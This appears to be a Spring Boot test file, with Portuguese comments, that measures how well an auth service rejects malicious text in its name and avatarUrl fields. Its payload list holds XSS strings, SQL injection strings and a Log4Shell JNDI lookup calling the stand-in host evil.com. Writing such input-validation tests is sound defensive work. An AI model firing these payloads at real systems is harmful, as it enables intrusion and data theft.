package com.justdoit.auth.qualidade;

import com.fasterxml.jackson.databind.ObjectMapper;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.MediaType;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.MvcResult;
import org.springframework.transaction.annotation.Transactional;

import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.atomic.AtomicInteger;

import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.put;

/**
 * Atributo de Qualidade: SEGURANÇA
 * Métrica: Taxa de Eficácia de Filtragem e Validação de Entrada de Texto
 *
 *   X = A / B            (0 <= X <= 1; ideal = 1)
 *   A = nº de requisições com textos maliciosos REJEITADAS com sucesso (HTTP 400).
 *   B = nº total de requisições com textos maliciosos disparadas.
 *
 * Recorte do auth-service: os campos de texto livre do cadastro e do perfil
 * ({@code name} e {@code avatarUrl}), protegidos por {@code @TextoSeguro}.
 *
 * NÃO entram na medição, por decisão de projeto:
 * - {@code password}/{@code newPassword}: senha legitimamente contém {@code < ' ;};
 *   filtrar enfraqueceria a política de senhas.
 * - {@code email}: já restringido por {@code @Email}.
 * - {@code refreshToken}: token opaco, com formato próprio.
 */
@SpringBootTest
@AutoConfigureMockMvc
@ActiveProfiles("test")
@Transactional
class ValidacaoEntradaMetricsTest {

    @Autowired private MockMvc mockMvc;
    @Autowired private ObjectMapper objectMapper;

    private static final List<String> PAYLOADS_MALICIOSOS = List.of(
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<iframe src=\"javascript:alert(1)\"></iframe>",
            "<body onload=alert(1)>",
            "\"><script>alert(1)</script>",
            "javascript:alert(document.cookie)",
            "${jndi:ldap://evil.com/a}",
            "'; DROP TABLE task; --",
            "1' OR '1'='1",
            "admin'--",
            "UNION SELECT password FROM users"
    );

    /** E-mail único por requisição: garante que um 400 veio da validação, não de e-mail duplicado. */
    private final AtomicInteger sequencia = new AtomicInteger();

    @Test
    @DisplayName("métrica de segurança: taxa de eficácia de filtragem de entrada deve ser 1.0")
    void taxaDeEficaciaDeFiltragemDeEntrada_deveSer1() throws Exception {
        String token = registrarEObterToken();

        int totalDisparadas = 0;   // B
        int totalRejeitadas = 0;   // A
        List<String> falhas = new ArrayList<>();

        for (String payload : PAYLOADS_MALICIOSOS) {
            for (Map.Entry<String, Integer> alvo : dispararEmTodosOsCampos(payload, token).entrySet()) {
                totalDisparadas++;
                if (alvo.getValue() == 400) {
                    totalRejeitadas++;
                } else {
                    falhas.add(String.format("%s com [%s] -> status %d",
                            alvo.getKey(), payload, alvo.getValue()));
                }
            }
        }

        double X = (double) totalRejeitadas / totalDisparadas;

        System.out.printf(
                "[MÉTRICA SEGURANÇA - VALIDAÇÃO DE ENTRADA] A=%d rejeitadas / B=%d maliciosas -> X = %.4f%n",
                totalRejeitadas, totalDisparadas, X);

        assertThat(falhas)
                .as("Brecha: campos que aceitaram texto malicioso em vez de rejeitar com 400")
                .isEmpty();
        assertThat(X)
                .as("Taxa de Eficácia de Filtragem e Validação de Entrada (X = A/B), ideal = 1")
                .isEqualTo(1.0);
    }

    @Test
    @DisplayName("nome legítimo com acento e apóstrofo continua sendo aceito")
    void nomeLegitimoContinuaSendoAceito() throws Exception {
        List<String> nomesLegitimos = List.of(
                "Maria D'Ávila", "José da Conceição", "Ana-Luísa Gonçalves");
        List<String> bloqueadosIndevidamente = new ArrayList<>();

        for (String nome : nomesLegitimos) {
            int status = registrar(nome);
            if (status != 201 && status != 200) {
                bloqueadosIndevidamente.add(nome + " -> status " + status);
            }
        }

        assertThat(bloqueadosIndevidamente)
                .as("Falso positivo: nome legítimo foi barrado pela proteção")
                .isEmpty();
    }

    // ─────────────────────────────────────────────
    // Alvos: cada campo de texto livre do serviço
    // ─────────────────────────────────────────────

    private Map<String, Integer> dispararEmTodosOsCampos(String payload, String token) throws Exception {
        Map<String, Integer> resultados = new LinkedHashMap<>();

        resultados.put("POST /auth/register (name)", registrar(payload));

        resultados.put("PUT /auth/me (name)",
                atualizarPerfil(token, Map.of("name", payload)));

        resultados.put("PUT /auth/me (avatarUrl)",
                atualizarPerfil(token, Map.of("avatarUrl", payload)));

        return resultados;
    }

    // ─────────────────────────────────────────────
    // Helpers
    // ─────────────────────────────────────────────

    private int registrar(String nome) throws Exception {
        Map<String, Object> corpo = new LinkedHashMap<>();
        corpo.put("name", nome);
        corpo.put("email", "metrica" + sequencia.incrementAndGet() + "@test.com");
        corpo.put("password", "Senha123456");
        corpo.put("birthDate", "1990-01-01");

        return mockMvc.perform(post("/auth/register")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(corpo)))
                .andReturn().getResponse().getStatus();
    }

    private int atualizarPerfil(String token, Map<String, Object> corpo) throws Exception {
        return mockMvc.perform(put("/auth/me")
                        .header("Authorization", "Bearer " + token)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(corpo)))
                .andReturn().getResponse().getStatus();
    }

    private String registrarEObterToken() throws Exception {
        Map<String, Object> corpo = new LinkedHashMap<>();
        corpo.put("name", "Usuário da Métrica");
        corpo.put("email", "dono-metrica@test.com");
        corpo.put("password", "Senha123456");
        corpo.put("birthDate", "1990-01-01");

        MvcResult result = mockMvc.perform(post("/auth/register")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(corpo)))
                .andReturn();

        return objectMapper.readTree(result.getResponse().getContentAsString())
                .get("accessToken").asText();
    }
}
